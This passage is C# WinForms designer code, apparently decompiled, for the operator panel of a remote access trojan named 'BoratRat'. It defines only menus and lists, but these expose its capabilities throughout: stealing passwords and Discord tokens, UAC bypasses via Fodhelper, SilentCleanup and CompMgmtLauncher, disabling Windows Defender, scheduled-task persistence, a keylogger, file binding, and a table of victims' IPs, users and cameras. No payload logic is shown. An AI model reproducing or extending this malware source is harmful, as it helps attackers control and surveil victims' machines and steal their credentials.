		this.PasswordRecoveryToolStripMenuItem.Name = "PasswordRecoveryToolStripMenuItem";
		this.PasswordRecoveryToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
		this.PasswordRecoveryToolStripMenuItem.Text = "Password Recovery";
		this.PasswordRecoveryToolStripMenuItem.Click += new System.EventHandler(PasswordRecoveryToolStripMenuItem_Click);
		this.DiscordRecoveryToolStripMenuItem.Name = "DiscordRecoveryToolStripMenuItem";
		this.DiscordRecoveryToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
		this.DiscordRecoveryToolStripMenuItem.Text = "Discord Recovery";
		this.DiscordRecoveryToolStripMenuItem.Click += new System.EventHandler(DiscordRecoveryToolStripMenuItem_Click);
		this.DisableUACToolStripMenuItem.Name = "DisableUACToolStripMenuItem";
		this.DisableUACToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
		this.DisableUACToolStripMenuItem.Text = "Disable UAC";
		this.DisableUACToolStripMenuItem.Click += new System.EventHandler(DisableUACToolStripMenuItem_Click);
		this.SystemControlToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.ClientControlToolStripMenuItem, this.SystemToolStripMenuItem });
		this.SystemControlToolStripMenuItem.Name = "SystemControlToolStripMenuItem";
		this.SystemControlToolStripMenuItem.Size = new System.Drawing.Size(155, 22);
		this.SystemControlToolStripMenuItem.Text = "System Control";
		this.ClientControlToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[6] { this.StopToolStripMenuItem1, this.RestartToolStripMenuItem1, this.noSystemToolStripMenuItem, this.UpdateToolStripMenuItem, this.UninstallToolStripMenuItem, this.ClientFolderToolStripMenuItem });
		this.ClientControlToolStripMenuItem.Name = "ClientControlToolStripMenuItem";
		this.ClientControlToolStripMenuItem.Size = new System.Drawing.Size(148, 22);
		this.ClientControlToolStripMenuItem.Text = "Client Control";
		this.StopToolStripMenuItem1.Name = "StopToolStripMenuItem1";
		this.StopToolStripMenuItem1.Size = new System.Drawing.Size(141, 22);
		this.StopToolStripMenuItem1.Text = "Stop";
		this.StopToolStripMenuItem1.Click += new System.EventHandler(StopToolStripMenuItem1_Click);
		this.RestartToolStripMenuItem1.Name = "RestartToolStripMenuItem1";
		this.RestartToolStripMenuItem1.Size = new System.Drawing.Size(141, 22);
		this.RestartToolStripMenuItem1.Text = "Restart";
		this.RestartToolStripMenuItem1.Click += new System.EventHandler(RestartToolStripMenuItem1_Click);
		this.noSystemToolStripMenuItem.Name = "noSystemToolStripMenuItem";
		this.noSystemToolStripMenuItem.Size = new System.Drawing.Size(141, 22);
		this.noSystemToolStripMenuItem.Text = "No System";
		this.noSystemToolStripMenuItem.Click += new System.EventHandler(noSystemToolStripMenuItem_Click);
		this.UpdateToolStripMenuItem.Name = "UpdateToolStripMenuItem";
		this.UpdateToolStripMenuItem.Size = new System.Drawing.Size(141, 22);
		this.UpdateToolStripMenuItem.Text = "Update";
		this.UpdateToolStripMenuItem.Click += new System.EventHandler(UpdateToolStripMenuItem_Click);
		this.UninstallToolStripMenuItem.Name = "UninstallToolStripMenuItem";
		this.UninstallToolStripMenuItem.Size = new System.Drawing.Size(141, 22);
		this.UninstallToolStripMenuItem.Text = "Uninstall";
		this.UninstallToolStripMenuItem.Click += new System.EventHandler(UninstallToolStripMenuItem_Click);
		this.ClientFolderToolStripMenuItem.Name = "ClientFolderToolStripMenuItem";
		this.ClientFolderToolStripMenuItem.Size = new System.Drawing.Size(141, 22);
		this.ClientFolderToolStripMenuItem.Text = "Client Folder";
		this.ClientFolderToolStripMenuItem.Click += new System.EventHandler(ClientFolderToolStripMenuItem_Click);
		this.SystemToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.ShutDownToolStripMenuItem, this.RebootToolStripMenuItem, this.LogoutToolStripMenuItem });
		this.SystemToolStripMenuItem.Name = "SystemToolStripMenuItem";
		this.SystemToolStripMenuItem.Size = new System.Drawing.Size(148, 22);
		this.SystemToolStripMenuItem.Text = "System";
		this.ShutDownToolStripMenuItem.Name = "ShutDownToolStripMenuItem";
		this.ShutDownToolStripMenuItem.Size = new System.Drawing.Size(132, 22);
		this.ShutDownToolStripMenuItem.Text = "Shut Down";
		this.ShutDownToolStripMenuItem.Click += new System.EventHandler(ShutDownToolStripMenuItem_Click);
		this.RebootToolStripMenuItem.Name = "RebootToolStripMenuItem";
		this.RebootToolStripMenuItem.Size = new System.Drawing.Size(132, 22);
		this.RebootToolStripMenuItem.Text = "Reboot";
		this.RebootToolStripMenuItem.Click += new System.EventHandler(RebootToolStripMenuItem_Click);
		this.LogoutToolStripMenuItem.Name = "LogoutToolStripMenuItem";
		this.LogoutToolStripMenuItem.Size = new System.Drawing.Size(132, 22);
		this.LogoutToolStripMenuItem.Text = "Logout";
		this.LogoutToolStripMenuItem.Click += new System.EventHandler(LogoutToolStripMenuItem_Click);
		this.BypassUACAToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.SilentCleanupToolStripMenuItem, this.FodhelperToolStripMenuItem, this.RunasToolStripMenuItem, this.CompMgmtLauncherToolStripMenuItem });
		this.BypassUACAToolStripMenuItem.Name = "BypassUACAToolStripMenuItem";
		this.BypassUACAToolStripMenuItem.Size = new System.Drawing.Size(155, 22);
		this.BypassUACAToolStripMenuItem.Text = "Bypass UAC";
		this.SilentCleanupToolStripMenuItem.Name = "SilentCleanupToolStripMenuItem";
		this.SilentCleanupToolStripMenuItem.Size = new System.Drawing.Size(189, 22);
		this.SilentCleanupToolStripMenuItem.Text = "Silent Cleanup";
		this.SilentCleanupToolStripMenuItem.Click += new System.EventHandler(SilentCleanupToolStripMenuItem_Click);
		this.FodhelperToolStripMenuItem.Name = "FodhelperToolStripMenuItem";
		this.FodhelperToolStripMenuItem.Size = new System.Drawing.Size(189, 22);
		this.FodhelperToolStripMenuItem.Text = "Fodhelper";
		this.FodhelperToolStripMenuItem.Click += new System.EventHandler(FodhelperToolStripMenuItem_Click);
		this.RunasToolStripMenuItem.Name = "RunasToolStripMenuItem";
		this.RunasToolStripMenuItem.Size = new System.Drawing.Size(189, 22);
		this.RunasToolStripMenuItem.Text = "Runas";
		this.RunasToolStripMenuItem.Click += new System.EventHandler(RunasToolStripMenuItem_Click);
		this.CompMgmtLauncherToolStripMenuItem.Name = "CompMgmtLauncherToolStripMenuItem";
		this.CompMgmtLauncherToolStripMenuItem.Size = new System.Drawing.Size(189, 22);
		this.CompMgmtLauncherToolStripMenuItem.Text = "CompMgmtLauncher";
		this.CompMgmtLauncherToolStripMenuItem.Click += new System.EventHandler(CompMgmtLauncherToolStripMenuItem_Click);
		this.InstallToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.SchtaskInstallToolStripMenuItem, this.SchtaskUninstallToolStripMenuItem, this.normalInstallToolStripMenuItem, this.normalUninstallToolStripMenuItem });
		this.InstallToolStripMenuItem.Name = "InstallToolStripMenuItem";
		this.InstallToolStripMenuItem.Size = new System.Drawing.Size(155, 22);
		this.InstallToolStripMenuItem.Text = "Install";
		this.SchtaskInstallToolStripMenuItem.Name = "SchtaskInstallToolStripMenuItem";
		this.SchtaskInstallToolStripMenuItem.Size = new System.Drawing.Size(163, 22);
		this.SchtaskInstallToolStripMenuItem.Text = "Schtask Install";
		this.SchtaskInstallToolStripMenuItem.Click += new System.EventHandler(SchtaskInstallToolStripMenuItem_Click);
		this.SchtaskUninstallToolStripMenuItem.Name = "SchtaskUninstallToolStripMenuItem";
		this.SchtaskUninstallToolStripMenuItem.Size = new System.Drawing.Size(163, 22);
		this.SchtaskUninstallToolStripMenuItem.Text = "Schtask Uninstall";
		this.SchtaskUninstallToolStripMenuItem.Click += new System.EventHandler(SchtaskUninstallToolStripMenuItem_Click);
		this.normalInstallToolStripMenuItem.Name = "normalInstallToolStripMenuItem";
		this.normalInstallToolStripMenuItem.Size = new System.Drawing.Size(163, 22);
		this.normalInstallToolStripMenuItem.Text = "Normal Install";
		this.normalInstallToolStripMenuItem.Click += new System.EventHandler(normalInstallToolStripMenuItem_Click);
		this.normalUninstallToolStripMenuItem.Name = "normalUninstallToolStripMenuItem";
		this.normalUninstallToolStripMenuItem.Size = new System.Drawing.Size(163, 22);
		this.normalUninstallToolStripMenuItem.Text = "Normal Uninstall";
		this.normalUninstallToolStripMenuItem.Click += new System.EventHandler(normalUninstallToolStripMenuItem_Click);
		this.justForFunToolStripMenuItem.Name = "justForFunToolStripMenuItem";
		this.justForFunToolStripMenuItem.Size = new System.Drawing.Size(155, 22);
		this.justForFunToolStripMenuItem.Text = "Utils";
		this.justForFunToolStripMenuItem.Click += new System.EventHandler(justForFunToolStripMenuItem_Click);
		this.InformationToolStripMenuItem.Name = "InformationToolStripMenuItem";
		this.InformationToolStripMenuItem.Size = new System.Drawing.Size(155, 22);
		this.InformationToolStripMenuItem.Text = "Information";
		this.InformationToolStripMenuItem.Click += new System.EventHandler(InformationToolStripMenuItem_Click);
		this.statusStrip1.AutoSize = false;
		this.statusStrip1.BackColor = System.Drawing.Color.FromArgb(60, 63, 65);
		this.statusStrip1.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.statusStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripStatusLabel1, this.toolStripStatusLabel2 });
		this.statusStrip1.Location = new System.Drawing.Point(0, 436);
		this.statusStrip1.Name = "statusStrip1";
		this.statusStrip1.Padding = new System.Windows.Forms.Padding(1, 0, 9, 0);
		this.statusStrip1.Size = new System.Drawing.Size(867, 22);
		this.statusStrip1.SizingGrip = false;
		this.statusStrip1.TabIndex = 1;
		this.statusStrip1.Text = "statusStrip1";
		this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
		this.toolStripStatusLabel1.Size = new System.Drawing.Size(16, 17);
		this.toolStripStatusLabel1.Text = "...";
		this.toolStripStatusLabel2.Name = "toolStripStatusLabel2";
		this.toolStripStatusLabel2.Size = new System.Drawing.Size(130, 17);
		this.toolStripStatusLabel2.Text = "                    Notification";
		this.toolStripStatusLabel2.Click += new System.EventHandler(ToolStripStatusLabel2_Click);
		this.ping.Enabled = true;
		this.ping.Interval = 30000;
		this.ping.Tick += new System.EventHandler(ping_Tick);
		this.UpdateUI.Enabled = true;
		this.UpdateUI.Interval = 500;
		this.UpdateUI.Tick += new System.EventHandler(UpdateUI_Tick);
		this.contextMenuLogs.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.contextMenuLogs.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.cLEARToolStripMenuItem });
		this.contextMenuLogs.Name = "contextMenuLogs";
		this.contextMenuLogs.ShowImageMargin = false;
		this.contextMenuLogs.Size = new System.Drawing.Size(77, 26);
		this.cLEARToolStripMenuItem.Name = "cLEARToolStripMenuItem";
		this.cLEARToolStripMenuItem.Size = new System.Drawing.Size(76, 22);
		this.cLEARToolStripMenuItem.Text = "Clear";
		this.cLEARToolStripMenuItem.Click += new System.EventHandler(CLEARToolStripMenuItem_Click);
		this.contextMenuThumbnail.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.contextMenuThumbnail.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.sTARTToolStripMenuItem, this.sTOPToolStripMenuItem });
		this.contextMenuThumbnail.Name = "contextMenuStrip2";
		this.contextMenuThumbnail.Size = new System.Drawing.Size(99, 48);
		this.sTARTToolStripMenuItem.ForeColor = System.Drawing.SystemColors.ControlText;
		this.sTARTToolStripMenuItem.Name = "sTARTToolStripMenuItem";
		this.sTARTToolStripMenuItem.Size = new System.Drawing.Size(98, 22);
		this.sTARTToolStripMenuItem.Text = "Start";
		this.sTARTToolStripMenuItem.Click += new System.EventHandler(STARTToolStripMenuItem_Click);
		this.sTOPToolStripMenuItem.Name = "sTOPToolStripMenuItem";
		this.sTOPToolStripMenuItem.Size = new System.Drawing.Size(98, 22);
		this.sTOPToolStripMenuItem.Text = "Stop";
		this.sTOPToolStripMenuItem.Click += new System.EventHandler(STOPToolStripMenuItem_Click);
		this.ThumbnailImageList.ColorDepth = System.Windows.Forms.ColorDepth.Depth16Bit;
		this.ThumbnailImageList.ImageSize = new System.Drawing.Size(256, 256);
		this.ThumbnailImageList.TransparentColor = System.Drawing.Color.Transparent;
		this.contextMenuTasks.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.contextMenuTasks.Items.AddRange(new System.Windows.Forms.ToolStripItem[11]
		{
			this.sendFileFromUrlToolStripMenuItem, this.downloadAndExecuteToolStripMenuItem, this.sENDFILETOMEMORYToolStripMenuItem1, this.disableUACToolStripMenuItem1, this.disableWDToolStripMenuItem1, this.installSchtaskToolStripMenuItem, this.uPDATEToolStripMenuItem1, this.autoKeyloggerToolStripMenuItem, this.fakeBinderToolStripMenuItem, this.toolStripSeparator4,
			this.dELETETASKToolStripMenuItem
		});
		this.contextMenuTasks.Name = "contextMenuStrip4";
		this.contextMenuTasks.ShowImageMargin = false;
		this.contextMenuTasks.Size = new System.Drawing.Size(157, 230);
		this.sendFileFromUrlToolStripMenuItem.Name = "sendFileFromUrlToolStripMenuItem";
		this.sendFileFromUrlToolStripMenuItem.Size = new System.Drawing.Size(156, 22);
		this.sendFileFromUrlToolStripMenuItem.Text = "Send file from url";
		this.sendFileFromUrlToolStripMenuItem.Click += new System.EventHandler(sendFileFromUrlToolStripMenuItem_Click);
		this.downloadAndExecuteToolStripMenuItem.Name = "downloadAndExecuteToolStripMenuItem";
		this.downloadAndExecuteToolStripMenuItem.Size = new System.Drawing.Size(156, 22);
		this.downloadAndExecuteToolStripMenuItem.Text = "Send file to disk";
		this.downloadAndExecuteToolStripMenuItem.Click += new System.EventHandler(DownloadAndExecuteToolStripMenuItem_Click);
		this.sENDFILETOMEMORYToolStripMenuItem1.Name = "sENDFILETOMEMORYToolStripMenuItem1";
		this.sENDFILETOMEMORYToolStripMenuItem1.Size = new System.Drawing.Size(156, 22);
		this.sENDFILETOMEMORYToolStripMenuItem1.Text = "Send file to memory";
		this.sENDFILETOMEMORYToolStripMenuItem1.Click += new System.EventHandler(SENDFILETOMEMORYToolStripMenuItem1_Click);
		this.disableUACToolStripMenuItem1.Name = "disableUACToolStripMenuItem1";
		this.disableUACToolStripMenuItem1.Size = new System.Drawing.Size(156, 22);
		this.disableUACToolStripMenuItem1.Text = "Disable UAC";
		this.disableUACToolStripMenuItem1.Click += new System.EventHandler(disableUACToolStripMenuItem1_Click);
		this.disableWDToolStripMenuItem1.Name = "disableWDToolStripMenuItem1";
		this.disableWDToolStripMenuItem1.Size = new System.Drawing.Size(156, 22);
		this.disableWDToolStripMenuItem1.Text = "Disable WD";
		this.disableWDToolStripMenuItem1.Click += new System.EventHandler(disableWDToolStripMenuItem1_Click);
		this.installSchtaskToolStripMenuItem.Name = "installSchtaskToolStripMenuItem";
		this.installSchtaskToolStripMenuItem.Size = new System.Drawing.Size(156, 22);
		this.installSchtaskToolStripMenuItem.Text = "Install Schtask";
		this.installSchtaskToolStripMenuItem.Click += new System.EventHandler(installSchtaskToolStripMenuItem_Click);
		this.uPDATEToolStripMenuItem1.Name = "uPDATEToolStripMenuItem1";
		this.uPDATEToolStripMenuItem1.Size = new System.Drawing.Size(156, 22);
		this.uPDATEToolStripMenuItem1.Text = "Update all clients";
		this.uPDATEToolStripMenuItem1.Click += new System.EventHandler(UPDATEToolStripMenuItem1_Click);
		this.autoKeyloggerToolStripMenuItem.Name = "autoKeyloggerToolStripMenuItem";
		this.autoKeyloggerToolStripMenuItem.Size = new System.Drawing.Size(156, 22);
		this.autoKeyloggerToolStripMenuItem.Text = "Auto Keylogger";
		this.autoKeyloggerToolStripMenuItem.Click += new System.EventHandler(autoKeyloggerToolStripMenuItem_Click);
		this.fakeBinderToolStripMenuItem.Name = "fakeBinderToolStripMenuItem";
		this.fakeBinderToolStripMenuItem.Size = new System.Drawing.Size(156, 22);
		this.fakeBinderToolStripMenuItem.Text = "Fake Binder";
		this.fakeBinderToolStripMenuItem.Click += new System.EventHandler(fakeBinderToolStripMenuItem_Click);
		this.toolStripSeparator4.Name = "toolStripSeparator4";
		this.toolStripSeparator4.Size = new System.Drawing.Size(153, 6);
		this.dELETETASKToolStripMenuItem.Name = "dELETETASKToolStripMenuItem";
		this.dELETETASKToolStripMenuItem.Size = new System.Drawing.Size(156, 22);
		this.dELETETASKToolStripMenuItem.Text = "Delete";
		this.dELETETASKToolStripMenuItem.Click += new System.EventHandler(DELETETASKToolStripMenuItem_Click);
		this.performanceCounter1.CategoryName = "Processor";
		this.performanceCounter1.CounterName = "% Processor Time";
		this.performanceCounter1.InstanceName = "_Total";
		this.performanceCounter2.CategoryName = "Memory";
		this.performanceCounter2.CounterName = "% Committed Bytes In Use";
		this.notifyIcon1.Icon = (System.Drawing.Icon)resources.GetObject("notifyIcon1.Icon");
		this.notifyIcon1.Text = "BoratRat";
		this.notifyIcon1.Visible = true;
		this.TimerTask.Enabled = true;
		this.TimerTask.Interval = 5000;
		this.TimerTask.Tick += new System.EventHandler(TimerTask_Tick);
		this.menuStrip1.BackColor = System.Drawing.Color.FromArgb(60, 63, 65);
		this.menuStrip1.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.menuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.FileToolStripMenuItem });
		this.menuStrip1.Location = new System.Drawing.Point(0, 0);
		this.menuStrip1.Name = "menuStrip1";
		this.menuStrip1.Padding = new System.Windows.Forms.Padding(3, 2, 0, 2);
		this.menuStrip1.Size = new System.Drawing.Size(867, 24);
		this.menuStrip1.TabIndex = 4;
		this.menuStrip1.Text = "menuStrip1";
		this.FileToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(60, 63, 65);
		this.FileToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.BuilderToolStripMenuItem, this.BlockToolStripMenuItem });
		this.FileToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.FileToolStripMenuItem.Name = "FileToolStripMenuItem";
		this.FileToolStripMenuItem.Size = new System.Drawing.Size(37, 20);
		this.FileToolStripMenuItem.Text = "File";
		this.BuilderToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.BuilderToolStripMenuItem.Name = "BuilderToolStripMenuItem";
		this.BuilderToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.BuilderToolStripMenuItem.Text = "Builder";
		this.BuilderToolStripMenuItem.Click += new System.EventHandler(builderToolStripMenuItem1_Click);
		this.BlockToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.BlockToolStripMenuItem.Name = "BlockToolStripMenuItem";
		this.BlockToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.BlockToolStripMenuItem.Text = "Blacklist";
		this.BlockToolStripMenuItem.Click += new System.EventHandler(BlockToolStripMenuItem_Click);
		this.splitContainer1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.splitContainer1.Location = new System.Drawing.Point(0, 24);
		this.splitContainer1.Name = "splitContainer1";
		this.splitContainer1.Orientation = System.Windows.Forms.Orientation.Horizontal;
		this.splitContainer1.Panel1.Controls.Add(this.tabControl1);
		this.splitContainer1.Panel2.Controls.Add(this.listView2);
		this.splitContainer1.Size = new System.Drawing.Size(867, 412);
		this.splitContainer1.SplitterDistance = 248;
		this.splitContainer1.TabIndex = 5;
		this.tabControl1.Controls.Add(this.tabPage1);
		this.tabControl1.Controls.Add(this.tabPage3);
		this.tabControl1.Controls.Add(this.tabPage4);
		this.tabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.tabControl1.Location = new System.Drawing.Point(0, 0);
		this.tabControl1.Margin = new System.Windows.Forms.Padding(2);
		this.tabControl1.Name = "tabControl1";
		this.tabControl1.SelectedIndex = 0;
		this.tabControl1.Size = new System.Drawing.Size(867, 248);
		this.tabControl1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
		this.tabControl1.TabIndex = 3;
		this.tabPage1.Controls.Add(this.listView1);
		this.tabPage1.Location = new System.Drawing.Point(4, 22);
		this.tabPage1.Margin = new System.Windows.Forms.Padding(2);
		this.tabPage1.Name = "tabPage1";
		this.tabPage1.Padding = new System.Windows.Forms.Padding(2);
		this.tabPage1.Size = new System.Drawing.Size(859, 222);
		this.tabPage1.TabIndex = 0;
		this.tabPage1.Text = "Clients";
		this.listView1.BackColor = System.Drawing.Color.FromArgb(69, 73, 74);
		this.listView1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[13]
		{
			this.lv_ip, this.lv_country, this.lv_group, this.lv_hwid, this.lv_user, this.lv_camera, this.lv_os, this.lv_version, this.lv_ins, this.lv_admin,
			this.lv_av, this.lv_ping, this.lv_act
		});
		this.listView1.ContextMenuStrip = this.contextMenuClient;
		this.listView1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.listView1.ForeColor = System.Drawing.Color.Gainsboro;
		this.listView1.FullRowSelect = true;
		this.listView1.GridLines = true;
		this.listView1.HideSelection = false;
		this.listView1.Location = new System.Drawing.Point(2, 2);
		this.listView1.Margin = new System.Windows.Forms.Padding(2);
		this.listView1.Name = "listView1";
		this.listView1.ShowGroups = false;
		this.listView1.ShowItemToolTips = true;
		this.listView1.Size = new System.Drawing.Size(855, 218);
		this.listView1.TabIndex = 0;
		this.listView1.UseCompatibleStateImageBehavior = false;
		this.listView1.View = System.Windows.Forms.View.Details;
		this.listView1.ColumnClick += new System.Windows.Forms.ColumnClickEventHandler(ListView1_ColumnClick);
		this.listView1.KeyDown += new System.Windows.Forms.KeyEventHandler(listView1_KeyDown);
		this.listView1.MouseMove += new System.Windows.Forms.MouseEventHandler(listView1_MouseMove);
		this.lv_ip.Text = "IP Port";
		this.lv_ip.Width = 121;
		this.lv_country.Text = "Country";
		this.lv_country.Width = 124;
		this.lv_group.Text = "Group";
		this.lv_hwid.Text = "HWID";
		this.lv_hwid.Width = 117;
		this.lv_user.Text = "User";
		this.lv_user.Width = 117;
		this.lv_camera.Text = "Camera";
		this.lv_os.Text = "OS version";
		this.lv_os.Width = 179;
		this.lv_version.Text = "Client version";
		this.lv_version.Width = 126;
		this.lv_ins.Text = "Installed time";
		this.lv_ins.Width = 120;
		this.lv_admin.Text = "Permission";
		this.lv_admin.Width = 166;
		this.lv_av.Text = "Anti-virus";
		this.lv_av.Width = 136;
		this.lv_ping.Text = "Ping";
		this.lv_act.Text = "Activity Program";
		this.lv_act.Width = 350;
		this.tabPage3.Controls.Add(this.listView3);
		this.tabPage3.Location = new System.Drawing.Point(4, 22);
		this.tabPage3.Margin = new System.Windows.Forms.Padding(2);
		this.tabPage3.Name = "tabPage3";
		this.tabPage3.Size = new System.Drawing.Size(859, 215);
		this.tabPage3.TabIndex = 2;
		this.tabPage3.Text = "Screens";
		this.tabPage3.UseVisualStyleBackColor = true;
		this.listView3.BackColor = System.Drawing.Color.FromArgb(69, 73, 74);
		this.listView3.ContextMenuStrip = this.contextMenuThumbnail;
		this.listView3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.listView3.ForeColor = System.Drawing.Color.Gainsboro;
		this.listView3.HideSelection = false;
		this.listView3.LargeImageList = this.ThumbnailImageList;
		this.listView3.Location = new System.Drawing.Point(0, 0);
		this.listView3.Margin = new System.Windows.Forms.Padding(2);
		this.listView3.Name = "listView3";
		this.listView3.ShowItemToolTips = true;
		this.listView3.Size = new System.Drawing.Size(859, 215);
		this.listView3.SmallImageList = this.ThumbnailImageList;
		this.listView3.TabIndex = 0;
		this.listView3.UseCompatibleStateImageBehavior = false;
		this.tabPage4.Controls.Add(this.listView4);
		this.tabPage4.Location = new System.Drawing.Point(4, 22);
		this.tabPage4.Margin = new System.Windows.Forms.Padding(2);
		this.tabPage4.Name = "tabPage4";
		this.tabPage4.Padding = new System.Windows.Forms.Padding(2);
		this.tabPage4.Size = new System.Drawing.Size(859, 215);
		this.tabPage4.TabIndex = 3;
		this.tabPage4.Text = "Auto Task";
		this.tabPage4.UseVisualStyleBackColor = true;
		this.listView4.BackColor = System.Drawing.Color.FromArgb(69, 73, 74);
		this.listView4.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.listView4.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { this.columnHeader4, this.columnHeader5 });
		this.listView4.ContextMenuStrip = this.contextMenuTasks;
		this.listView4.Dock = System.Windows.Forms.DockStyle.Fill;
		this.listView4.ForeColor = System.Drawing.Color.Gainsboro;
		this.listView4.FullRowSelect = true;
		this.listView4.HideSelection = false;
		this.listView4.Location = new System.Drawing.Point(2, 2);
		this.listView4.Margin = new System.Windows.Forms.Padding(2);
		this.listView4.Name = "listView4";
		this.listView4.Size = new System.Drawing.Size(855, 211);
		this.listView4.TabIndex = 0;
		this.listView4.UseCompatibleStateImageBehavior = false;
		this.listView4.View = System.Windows.Forms.View.Details;
		this.columnHeader4.Text = "Task";
		this.columnHeader4.Width = 97;
		this.columnHeader5.Text = "Run times";
		this.columnHeader5.Width = 116;
		this.ConnectTimeout.Enabled = true;
		this.ConnectTimeout.Interval = 5000;
		this.ConnectTimeout.Tick += new System.EventHandler(ConnectTimeout_Tick);
		this.columnHeader1.Text = "Time";
		this.columnHeader1.Width = 150;
		this.columnHeader2.Text = "Logs";
		this.columnHeader2.Width = 705;
		this.listView2.BackColor = System.Drawing.Color.FromArgb(69, 73, 74);
		this.listView2.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.listView2.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { this.columnHeader1, this.columnHeader2 });
		this.listView2.ContextMenuStrip = this.contextMenuLogs;
		this.listView2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.listView2.ForeColor = System.Drawing.Color.Gainsboro;
		this.listView2.FullRowSelect = true;
		this.listView2.GridLines = true;
		this.listView2.HideSelection = false;
		this.listView2.Location = new System.Drawing.Point(0, 0);
		this.listView2.Margin = new System.Windows.Forms.Padding(2);
		this.listView2.Name = "listView2";
		this.listView2.ShowGroups = false;
		this.listView2.ShowItemToolTips = true;
		this.listView2.Size = new System.Drawing.Size(867, 160);
		this.listView2.TabIndex = 2;
		this.listView2.UseCompatibleStateImageBehavior = false;
		this.listView2.View = System.Windows.Forms.View.Details;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(867, 458);
		base.Controls.Add(this.splitContainer1);
		base.Controls.Add(this.statusStrip1);
		base.Controls.Add(this.menuStrip1);
		base.MainMenuStrip = this.menuStrip1;
		base.Margin = new System.Windows.Forms.Padding(2);
		base.Name = "Form1";
		base.ShowIcon = false;
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "BoratRat";
		base.Activated += new System.EventHandler(Form1_Activated);
		base.Deactivate += new System.EventHandler(Form1_Deactivate);
		base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(Form1_FormClosed);
		base.Load += new System.EventHandler(Form1_Load);
		this.contextMenuClient.ResumeLayout(false);
		this.statusStrip1.ResumeLayout(false);
		this.statusStrip1.PerformLayout();
		this.contextMenuLogs.ResumeLayout(false);
		this.contextMenuThumbnail.ResumeLayout(false);
		this.contextMenuTasks.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.performanceCounter1).EndInit();
		((System.ComponentModel.ISupportInitialize)this.performanceCounter2).EndInit();
		this.menuStrip1.ResumeLayout(false);
		this.menuStrip1.PerformLayout();
		this.splitContainer1.Panel1.ResumeLayout(false);
		this.splitContainer1.Panel2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.splitContainer1).EndInit();
		this.splitContainer1.ResumeLayout(false);
		this.tabControl1.ResumeLayout(false);
		this.tabPage1.ResumeLayout(false);
		this.tabPage3.ResumeLayout(false);
		this.tabPage4.ResumeLayout(false);
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	static Form1()
	{
		getTasks = new List<AsyncTask>();
	}
}
